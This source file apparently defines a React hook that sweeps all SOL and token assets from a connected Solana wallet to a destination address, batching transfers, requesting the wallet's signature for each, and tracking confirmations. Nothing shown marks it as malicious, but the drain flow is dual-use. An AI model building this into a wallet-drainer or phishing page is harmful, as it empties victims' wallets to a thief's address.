import { useCallback, useState } from "react";
// REMOVED: import { useLanguage } from "../i18n/LanguageProvider";
import { buildDrainBatches } from "../lib/drain.jsx";
import {
  formatTransactionError,
  getWorkingConnection,
  waitForTransactionConfirmation,
} from "../lib/solana";

function isSolanaReady(solana) {
  return (
    !!solana &&
    typeof solana.signAndSendTransaction === "function" &&
    !!solana.publicKey
  );
}

function toWalletAddress(value) {
  if (!value) {
    return "";
  }

  if (typeof value === "string") {
    return value.trim();
  }

  if (typeof value.toBase58 === "function") {
    return value.toBase58();
  }

  if (typeof value.toString === "function") {
    return value.toString().trim();
  }

  return "";
}

function mapTransferError(message) {
  if (message === "insufficient_lamports") {
    return "Insufficient SOL balance for transfer.";
  }

  if (message === "insufficient_rent") {
    return "Insufficient SOL balance to meet rent exemption.";
  }

  if (message === "frozen_account") {
    return "Token account is frozen.";
  }

  if (message.startsWith("confirmation_timeout:")) {
    const signature = message.slice("confirmation_timeout:".length);
    return `Transaction confirmation timed out. Signature: ${signature}`;
  }

  return message;
}

export function useDrainWallet(solana, sourceAddress) {
  // REMOVED: const { t } = useLanguage();
  const [progress, setProgress] = useState({ status: "idle" });

  const drain = useCallback(
    async (destination, assets) => {
      if (!isSolanaReady(solana) || !sourceAddress) {
        setProgress({
          status: "error",
          message: "Please connect your wallet first.",
        });
        return;
      }

      const normalizedSourceAddress = toWalletAddress(sourceAddress);
      const connectedWalletAddress = toWalletAddress(solana.publicKey);

      if (
        !normalizedSourceAddress ||
        !connectedWalletAddress ||
        normalizedSourceAddress !== connectedWalletAddress
      ) {
        setProgress({
          status: "error",
          message: "Connected wallet mismatch.",
        });
        return;
      }

      setProgress({ status: "preparing" });

      try {
        const batches = await buildDrainBatches(
          normalizedSourceAddress,
          destination,
          assets
        );

        if (batches.length === 0) {
          throw new Error("No assets found to transfer.");
        }

        const signatures = [];
        const skippedFailures = [];

        for (let index = 0; index < batches.length; index += 1) {
          const batch = batches[index];

          setProgress({
            status: "signing",
            current: index + 1,
            total: batches.length,
            label: batch.label,
          });

          try {
            const transaction = await batch.build();
            const result = await solana.signAndSendTransaction(transaction);
            const signature =
              result.signature ??
              ("hash" in result ? String(result.hash) : undefined);

            if (!signature) {
              throw new Error("Transfer failed. No signature returned.");
            }

            setProgress({
              status: "confirmed",
              current: index + 1,
              total: batches.length,
              signature,
            });

            try {
              await waitForTransactionConfirmation(signature);
            } catch (confirmationError) {
              const confirmationMessage =
                confirmationError instanceof Error
                  ? confirmationError.message
                  : "Transfer failed.";

              if (confirmationMessage.startsWith("confirmation_timeout:")) {
                const connection = await getWorkingConnection();
                const status = await connection.getSignatureStatuses(
                  [signature],
                  { searchTransactionHistory: true }
                );
                const onChain = status.value[0];

                if (onChain?.err) {
                  throw new Error(formatTransactionError(onChain.err));
                }

                if (
                  onChain?.confirmationStatus === "confirmed" ||
                  onChain?.confirmationStatus === "finalized"
                ) {
                  signatures.push(signature);
                  continue;
                }
              }

              throw confirmationError;
            }

            signatures.push(signature);
          } catch (error) {
            const rawMessage =
              error instanceof Error ? error.message : "Transfer failed.";
            const message = mapTransferError(rawMessage);
            skippedFailures.push({ label: batch.label, message });

            if (batch.label === "SOL" && signatures.length === 0) {
              throw new Error(message);
            }
          }
        }

        if (signatures.length === 0) {
          const lastFailure = skippedFailures[skippedFailures.length - 1];
          throw new Error(
            lastFailure?.message ?? "Transfer failed."
          );
        }

        setProgress({
          status: "done",
          signatures,
          skippedFailures:
            skippedFailures.length > 0 ? skippedFailures : undefined,
        });
      } catch (error) {
        const rawMessage =
          error instanceof Error ? error.message : "Transfer failed.";
        setProgress({
          status: "error",
          message: mapTransferError(rawMessage),
        });
      }
    },
    [solana, sourceAddress]
  );

  const reset = useCallback(() => {
    setProgress({ status: "idle" });
  }, []);

  return { drain, progress, reset };
}
